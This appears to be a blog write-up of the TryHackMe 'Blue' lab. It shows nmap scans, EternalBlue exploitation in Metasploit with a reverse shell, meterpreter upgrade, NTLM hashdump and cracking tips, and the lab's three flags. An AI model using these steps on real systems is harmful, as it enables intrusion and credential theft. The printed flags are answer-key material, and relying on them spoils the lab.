---
title: "Blue"
date: 2022-09-20T16:00:31+01:00
draft: false
categories:
  - TryHackMe
---

<img src="Blue.gif" width=200 height=200 alt="blue">

This is actually one of my favorites rooms 

It is a guided room initiation to eternal blue exploitation

## Enumeration

### nmap

```
nmap -sV -sC -vv 10.10.167.119 -Pn
...

PORT      STATE SERVICE            REASON  VERSION
135/tcp   open  msrpc              syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn        syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       syn-ack Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)

3389/tcp  open  ssl/ms-wbt-server? syn-ack
|_ssl-date: 2022-01-19T19:11:18+00:00; +2m40s from scanner time.
| ssl-cert: Subject: commonName=Jon-PC
| Issuer: commonName=Jon-PC
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2022-01-18T19:06:22
| Not valid after:  2022-07-20T19:06:22
| MD5:   d1ce 8d03 42c7 c693 1938 3f46 1621 7542
| SHA-1: 5e1f d433 548c ed1c 21a7 60c4 69b9 07ca 2d16 e60f
| -----BEGIN CERTIFICATE-----
| MIIC0DCCAbigAwIBAgIQQ2xZBQI6xKlFTU4ur0ofEDANBgkqhkiG9w0BAQUFADAR
| MQ8wDQYDVQQDEwZKb24tUEMwHhcNMjIwMTE4MTkwNjIyWhcNMjIwNzIwMTkwNjIy
| WjARMQ8wDQYDVQQDEwZKb24tUEMwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEK
| AoIBAQDOHu2yaPoA/thAcKBeS+704v6S/AWVU4IYYWHBhxC0GGDV4zdZs66A9HGi
| VO12ABWxI1EviOXEc1/hUXtbQ5mFuYAo8iyKM5onevEr2vjvDccaZD2c2tqOY/dY
| 4Os/pkst2xW+/PGwYQDxTTiqThplRWIffJr4Eku2kpCYNL9LA29MqHolaY6BGRSh
| drOVfEhNOHVVXqSU/Cubq7vfWQmU0lFOKl5hFy3qfJodCWfneGF5nB8e04IcQ1s9
| JXyWsDpTPQKUIGH4AAf5VJuKfru+EMZ1eonlqILyGXLuRyvFGC4aYI98rgCoioSV
| +7b7mXVhXwwVQ3crzt78vYj24SKTAgMBAAGjJDAiMBMGA1UdJQQMMAoGCCsGAQUF
| BwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQUFAAOCAQEAxR+/GUndYpTXPQia
| j6ZVph748HvME0xnOom9+mIh1Jyqm8gFVKOUJq5fQISPGbxipQKjcojR+cuooL8b
| L/hGyhTXP89FR5q8Zx38bxgkKBNNGOMzZMKrwPU4ktbxgB05PgScSdT4uSSA16v2
| tmXCKYNPsd9ZYk/gV+uNkopg4zyD8p2GMhSgoq3NkkdYxhBREqMtFjWPh/nkZzOW
| UvH/JCJMtOZnAW+bI7C7LkfW+JyjDmcVKcyu95wnbXeNf/TN2avLpnqGJFfGwZA8
| quqCPP/y/cj/VMjkLKqg84HBdjHscA5Jofb9l5cTj4+cb9tiKgrwYMV01KnWfGed
| /lhz7Q==
|_-----END CERTIFICATE-----

49152/tcp open  msrpc              syn-ack Microsoft Windows RPC
49153/tcp open  msrpc              syn-ack Microsoft Windows RPC
49154/tcp open  msrpc              syn-ack Microsoft Windows RPC
49158/tcp open  msrpc              syn-ack Microsoft Windows RPC
49160/tcp open  msrpc              syn-ack Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 51387/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 17757/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 43168/udp): CLEAN (Timeout)
|   Check 4 (port 54355/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 1h32m40s, deviation: 3h00m00s, median: 2m39s
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
| nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:94:f0:59:6b:d5 (unknown)
| Names:
|   JON-PC<00>           Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   JON-PC<20>           Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
| Statistics:
|   02 94 f0 59 6b d5 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-01-19T13:11:05-06:00
| smb2-time: 
|   date: 2022-01-19T19:11:05
|_  start_date: 2022-01-19T19:06:21
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

```
Look at those `smb ports` open...

If you used `--script vuln` option with nmap as suggested you get this

```
PORT      STATE SERVICE       REASON
135/tcp   open  msrpc         syn-ack
139/tcp   open  netbios-ssn   syn-ack
445/tcp   open  microsoft-ds  syn-ack
3389/tcp  open  ms-wbt-server syn-ack

|_ssl-ccs-injection: No reply from server (TIMEOUT)
| rdp-vuln-ms12-020: 
|   VULNERABLE:
|   MS12-020 Remote Desktop Protocol Denial Of Service Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0152
|     Risk factor: Medium  CVSSv2: 4.3 (MEDIUM) (AV:N/AC:M/Au:N/C:N/I:N/A:P)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to cause a denial of service.
|           
|     Disclosure date: 2012-03-13
|     References:
|       http://technet.microsoft.com/en-us/security/bulletin/ms12-020
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0152
|   
|   MS12-020 Remote Desktop Protocol Remote Code Execution Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0002
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to execute arbitrary code on the targeted system.
|           
|     Disclosure date: 2012-03-13
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0002
|_      http://technet.microsoft.com/en-us/security/bulletin/ms12-020
49152/tcp open  unknown       syn-ack
49153/tcp open  unknown       syn-ack
49154/tcp open  unknown       syn-ack
49158/tcp open  unknown       syn-ack
49160/tcp open  unknown       syn-ack

Host script results:
|_smb-vuln-ms10-054: false
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

```
yeah, you can google `ms17-010` and learn about `eternalblue`

Then fire up metasploit for easy access

you can search for eternalbue if you didnt find the metasploit path on google already

```
msf6 > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target

```

fill the options correctly and run/exploit

I suppose you already know metasploit so I wont insult you by showing all steps

For academic reasons we change the payload from automatic meterpreter to a simple shell

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp
payload => windows/x64/shell/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[-] Handler failed to bind to 10.8.226.203:4444:-  -
[*] Started reverse TCP handler on 0.0.0.0:4444 
[*] 10.10.167.119:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.167.119:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.167.119:445     - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.167.119:445 - The target is vulnerable.
[*] 10.10.167.119:445 - Connecting to target for exploitation.
[+] 10.10.167.119:445 - Connection established for exploitation.
[+] 10.10.167.119:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.167.119:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.167.119:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.167.119:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.167.119:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.167.119:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.167.119:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.167.119:445 - Sending all but last fragment of exploit packet
[*] 10.10.167.119:445 - Starting non-paged pool grooming
[+] 10.10.167.119:445 - Sending SMBv2 buffers
[+] 10.10.167.119:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.167.119:445 - Sending final SMBv2 buffers.
[*] 10.10.167.119:445 - Sending last fragment of exploit packet!
[*] 10.10.167.119:445 - Receiving response from exploit packet
[+] 10.10.167.119:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.167.119:445 - Sending egg to corrupted connection.
[*] 10.10.167.119:445 - Triggering free of corrupted buffer.
[-] 10.10.167.119:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.10.167.119:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.10.167.119:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] 10.10.167.119:445 - Connecting to target for exploitation.
[+] 10.10.167.119:445 - Connection established for exploitation.
[+] 10.10.167.119:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.167.119:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.167.119:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.167.119:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.167.119:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.167.119:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.167.119:445 - Trying exploit with 17 Groom Allocations.
[*] 10.10.167.119:445 - Sending all but last fragment of exploit packet
[*] 10.10.167.119:445 - Starting non-paged pool grooming
[+] 10.10.167.119:445 - Sending SMBv2 buffers
[+] 10.10.167.119:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.167.119:445 - Sending final SMBv2 buffers.
[*] 10.10.167.119:445 - Sending last fragment of exploit packet!
[*] 10.10.167.119:445 - Receiving response from exploit packet
[+] 10.10.167.119:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.167.119:445 - Sending egg to corrupted connection.
[*] 10.10.167.119:445 - Triggering free of corrupted buffer.
[*] Sending stage (336 bytes) to 10.0.2.2
[*] Command shell session 2 opened (10.0.2.15:4444 -> 10.0.2.2:49213) at 2022-01-19 20:35:21 +0100
[+] 10.10.167.119:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.167.119:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.167.119:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=


Shell Banner:
Microsoft Windows [Version 6.1.7601]
-----
          

C:\Windows\system32>

```
We are in!

## Privilege escalation

background that session (note the number...2 for me) and use `shell_to_meterpreter` for escalation

```
C:\Windows\system32>^Z
Background session 2? [y/N]  y
msf6 exploit(windows/smb/ms17_010_eternalblue) > use post/multi/manage/shell_to_meterpreter
msf6 post(multi/manage/shell_to_meterpreter) > options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on.

msf6 post(multi/manage/shell_to_meterpreter) > set SESSION 2
SESSION => 2
msf6 post(multi/manage/shell_to_meterpreter) > set LHOST 10.8.226.203
LHOST => 10.8.226.203
msf6 post(multi/manage/shell_to_meterpreter) > run

[*] Upgrading session ID: 2
[*] Starting exploit/multi/handler
[-] Handler failed to bind to 10.8.226.203:4433:-  -
[*] Started reverse TCP handler on 0.0.0.0:4433 
[-] Powershell is not installed on the target.
[*] Command stager progress: 1.66% (1699/102108 bytes)
[*] Command stager progress: 3.33% (3398/102108 bytes)
...

[*] Command stager progress: 98.15% (100216/102108 bytes)
[*] Command stager progress: 99.78% (101888/102108 bytes)

[*] Upgrading session ID: 2
[*] Starting exploit/multi/handler
[-] Handler failed to bind to 10.8.226.203:4433:-  -
[*] Started reverse TCP handler on 0.0.0.0:4433 
[*] Post module execution completed
msf6 post(multi/manage/shell_to_meterpreter) > 
[*] Sending stage (175174 bytes) to 10.0.2.2
[*] Meterpreter session 3 opened (10.0.2.15:4433 -> 10.0.2.2:49224) at 2022-01-19 20:43:48 +0100
[*] Stopping exploit/multi/handler

```
I get my meterpreter on session 3
```
sessions 3
[*] Starting interaction with 3...

meterpreter > shell
Process 2060 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

```
Good! we got privileges! Let's migrate to a better process

```
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System                x64   0
 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe
 544   536   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 588   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 596   536   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe
 604   584   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 644   584   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
 692   596   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe
 700   596   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
 708   596   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsm.exe
 816   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 884   692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 932   692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1000  644   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\LogonUI.exe
 1020  692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1068  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1160  692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1324  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1388  692   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
 1464  692   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Xentools\LiteAgent.exe
 1604  692   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
 1924  692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1936  544   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
 1956  816   WmiPrvSE.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wbem\WmiPrvSE.exe
 2060  2452  cmd.exe               x86   0        NT AUTHORITY\SYSTEM           C:\Windows\SysWOW64\cmd.exe
 2064  816   WmiPrvSE.exe          x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\wbem\WmiPrvSE.exe
 2084  544   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
 2244  3032  powershell.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 2252  2900  cmd.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\cmd.exe
 2320  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 2344  692   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\sppsvc.exe
 2452  2244  powershell.exe        x86   0        NT AUTHORITY\SYSTEM           C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe
 2456  692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2548  692   vds.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\vds.exe
 2688  692   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\SearchIndexer.exe
 2900  692   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 3028  544   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
 3036  692   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\servicing\TrustedInstaller.exe

meterpreter > migrate 2900
[*] Migrating from 2452 to 2900...
[*] Migration completed successfully.

```

## post-exploitation

Its looting time! dump some informations!

```
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::


```
Cracking time! 

Those are windows NTLM hashes! even crackstation get this done

alternatiely we can use john or hashcat (mode 1000) with rockyou.txt


For flags just look in classic locations

The root...okay its not so classic but always check here

```
meterpreter > shell
Process 2648 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>cd C:\
cd C:\

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is E611-0B66

 Directory of C:\

03/17/2019  01:27 PM                24 flag1.txt
07/13/2009  09:20 PM    <DIR>          PerfLogs
04/12/2011  02:28 AM    <DIR>          Program Files
03/17/2019  04:28 PM    <DIR>          Program Files (x86)
12/12/2018  09:13 PM    <DIR>          Users
03/17/2019  04:36 PM    <DIR>          Windows
               1 File(s)             24 bytes
               5 Dir(s)  20,440,936,448 bytes free

C:\>type flag1.txt
type flag1.txt
flag{the_root_of_all_evil}
```

The SAM database store juicy info and passwords (it can be dumped too)

Its in system32 folder (config subfolder) so be cautious moving there

```
C:\Windows\System32\config>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is E611-0B66

 Directory of C:\Windows\System32\config

01/19/2022  01:06 PM    <DIR>          .
01/19/2022  01:06 PM    <DIR>          ..
12/12/2018  05:00 PM            28,672 BCD-Template
01/19/2022  01:16 PM        18,087,936 COMPONENTS
01/19/2022  01:39 PM           262,144 DEFAULT
03/17/2019  01:32 PM                34 flag2.txt
07/13/2009  08:34 PM    <DIR>          Journal
01/19/2022  01:35 PM    <DIR>          RegBack
03/17/2019  02:05 PM           262,144 SAM
01/19/2022  01:16 PM           262,144 SECURITY
01/19/2022  01:42 PM        40,632,320 SOFTWARE
01/19/2022  01:58 PM        12,582,912 SYSTEM
11/20/2010  08:41 PM    <DIR>          systemprofile
12/12/2018  05:03 PM    <DIR>          TxR
               8 File(s)     72,118,306 bytes
               6 Dir(s)  20,440,936,448 bytes free

C:\Windows\System32\config>type flag2.txt
type flag2.txt
flag{uncle_sam_is_your_friend}

```
And obviously...the Users folders

Flags are usually here in Desktop or Documents subfolders

```
C:\Users\Jon\Documents>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is E611-0B66

 Directory of C:\Users\Jon\Documents

12/12/2018  09:49 PM    <DIR>          .
12/12/2018  09:49 PM    <DIR>          ..
03/17/2019  01:26 PM                37 flag3.txt
               1 File(s)             37 bytes
               2 Dir(s)  20,440,936,448 bytes free

C:\Users\Jon\Documents>type flag3.txt
type flag3.txt
flag{jon_is_the_administrator_here}

```

And its done! you pwn this machine and master `eternablue` vulnerability!

I like the cool name (like shellshock and heartleed...cool vuln names)

you can read more about it and learn how it led to the `wannacry` disater




